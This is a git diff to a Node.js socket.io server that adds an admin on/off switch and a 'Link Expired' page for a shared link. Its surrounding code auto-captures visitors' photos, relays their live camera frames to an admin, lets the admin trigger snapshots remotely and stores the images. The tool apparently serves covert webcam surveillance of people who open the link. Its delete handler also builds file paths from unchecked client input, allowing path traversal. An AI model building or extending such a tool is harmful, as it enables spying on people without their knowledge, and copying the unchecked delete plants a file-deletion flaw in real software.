@@ -15,6 +15,24 @@ if (!fs.existsSync(uploadDir)) {
 
 let storedPhotos = [];
 let isAutoCaptureOn = true;
+let isLinkActive = true; // Link access state control
+
+// Middleware / Route check for Link ON/OFF status
+app.use((req, res, next) => {
+    if (!isLinkActive && req.path !== '/admin.html') {
+        return res.send(`
+            <!DOCTYPE html>
+            <html lang="en">
+            <head><title>Link Expired</title></head>
+            <body style="background:#111; color:#fff; text-align:center; padding-top:20vh; font-family:sans-serif;">
+                <h2>⚠️ This link is currently disabled by Admin.</h2>
+                <p>Please try again later.</p>
+            </body>
+            </html>
+        `);
+    }
+    next();
+});
 
 app.get('/admin.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin.html'));
@@ -37,22 +55,36 @@ io.on('connection', (socket) => {
         socket.emit('load-stored-photos', storedPhotos);
     });
 
+    // Admin toggle link state handler
+    socket.on('admin-toggle-link', (status) => {
+        isLinkActive = status;
+        console.log(`🔗 Link status changed by Admin: ${isLinkActive}`);
+        if (!isLinkActive) {
+            // Disconnect/stop active users instantly
+            io.emit('disable-user-access');
+        }
+    });
+
     socket.on('user-ready', () => {
-        if (isAutoCaptureOn) {
+        if (isAutoCaptureOn && isLinkActive) {
             socket.emit('start-auto-capture');
         }
     });
 
-    // Relay smooth video frame
     socket.on('live-stream-frame', (frameData) => {
-        io.emit('update-live-stream', frameData);
+        if (isLinkActive) {
+            io.emit('update-live-stream', frameData);
+        }
     });
 
     socket.on('admin-trigger-capture', () => {
-        io.emit('capture-photo');
+        if (isLinkActive) {
+            io.emit('capture-photo');
+        }
     });
 
     socket.on('user-photo-captured', (imageData) => {
+        if (!isLinkActive) return;
         const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
         const fileName = `photo_${Date.now()}.jpg`;
         const filePath = path.join(uploadDir, fileName);
@@ -69,7 +101,6 @@ io.on('connection', (socket) => {
         io.emit('send-photo-to-admin', photoObj);
     });
 
-    // Handle Delete Request
     socket.on('delete-photo', (fileName) => {
         storedPhotos = storedPhotos.filter(p => p.fileName !== fileName);
         const filePath = path.join(uploadDir, fileName);
